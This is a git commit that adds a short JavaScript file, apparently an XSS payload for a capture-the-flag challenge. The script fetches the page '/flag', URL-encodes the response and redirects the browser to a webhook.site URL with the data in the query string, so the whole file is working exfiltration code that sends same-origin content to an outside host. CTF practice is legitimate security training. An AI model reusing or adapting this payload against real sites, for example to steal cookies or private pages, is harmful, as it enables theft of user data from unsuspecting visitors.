ae066db7aa0343c53f2d24707db0537641906560
Mayank Kumar Choubey <61092858+mr-xhunt@users.noreply.github.com>
2023-03-04 17:09:32 +0530

    Update and rename mxgg.js to abd.js

---
+++ abd.js
@@ -0,0 +1,16 @@
+async function sendFlagToWebhook(webhookUrl) {
+  try {
+    const response = await fetch('/flag');
+    const data = await response.text();
+    console.log(data);
+
+    const encodedData = encodeURIComponent(data);
+    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;
+
+    document.location = urlWithQueryParams;
+  } catch (error) {
+    console.error('Error:', error);
+  }
+}
+
+sendFlagToWebhook('https://webhook.site/804c6227-d9a7-4ae4-9a58-c94a51ae5912');
